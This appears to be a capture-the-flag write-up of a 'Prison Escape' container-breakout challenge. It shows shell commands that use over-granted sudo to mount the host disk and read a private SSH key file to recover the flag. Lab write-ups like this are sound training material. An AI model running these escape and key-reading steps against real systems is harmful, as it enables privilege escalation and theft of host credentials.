---
sidebar_position: 2
---

# Prison Escape

## Objective

> Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv?

## Helpful hints

```
Over-Permissioned
From: Bow Ninecandle
Terminal: Prison Escape
When users are over-privileged, they can often act as root. When containers have too many permissions, they can affect the host!
```

```
Mount Up and Ride
From: Bow Ninecandle
Terminal: Prison Escape
Were you able to mount up? If so, users' home/ directories can be a great place to look for secrets...
```

## Escaping prison

First thing, who am I

```bash
grinchum-land:~$ whoami
samways
```

Then find out user and group names and numeric ID's (UID or group ID) of the current user:

```bash
grinchum-land:~$ id
uid=1000(samways) gid=1000(users) groups=1000(users)
```

Nothing much of interest, user is the first created user on this system. Can this user do sudo?

```bash
grinchum-land:~$ sudo ls /
app      config    docker-mods  init       media  package  run   sys  var
bin      defaults  etc          keygen.sh  mnt    proc     sbin  tmp
command  dev       home         lib        opt    root     srv   usr
grinchum-land:~$ 
```

Yes it can! Finding out if this jail is mounted somewhere 

```bash
grinchum-land:~$ sudo fdisk -l
Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/vda doesn't contain a valid partition table
grinchum-land:~$ 
```

Let's mount /dev/vda and see what it contains!

```bash
grinchum-land:~$ mkdir /tmp/hackdrive
grinchum-land:~$ sudo mount /dev/vda /tmp/hackdrive/
grinchum-land:~$ ls /tmp/hackdrive/
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
grinchum-land:~$ ls /tmp/hackdrive/home/
jailer
```

Seems I hit things spot on. Going for the kill: 

```bash
grinchum-land:~$ cat /tmp/hackdrive/home/jailer/.ssh/jail.key.priv
               Congratulations! 

          You've found the secret for the 
          HHC22 container escape challenge!

                     .--._..--.
              ___   ( _'-_  -_.'
          _.-'   `-._|  - :- |
      _.-'           `--...__|
   .-'                       '--..___
  / `._                              \
   `. `._               one           |
     `. `._                           /
       '. `._    :__________....-----'
         `..`---'    |-_  _- |___...----..._
                     |_....--'             `.`.
               _...--'                       `.`.
          _..-'                             _.'.'
       .-'             step                _.'.'
       |                               _.'.'
       |                   __....------'-'
       |     __...------''' _|
       '--'''        |-  - _ |
               _.-''''''''''''''''''-._
            _.'                        |\
          .'                         _.' |
          `._          closer           |:.'
            `._                     _.' |
               `..__                 |  |
                    `---.._.--.    _|  |
                     | _   - | `-.._|_.'
          .--...__   |   -  _|
         .'_      `--.....__ |
        .'_                 `--..__
       .'_                         `.
      .'_    082bb339ec19de4935867   `-.
      `--..____                        _`.
               ```--...____          _..--'
                     | - _ ```---.._.'
                     |   - _ |
                     |_ -  - |
                     |   - _ |
                     | -_  -_|
                     |   - _ |
                     |   - _ |
                     | -_  -_|
```

## Handy resources

* https://serverfault.com/questions/803388/what-is-the-difference-between-dev-vda-and-dev-sda
* https://tbhaxor.com/container-breakout-part-1/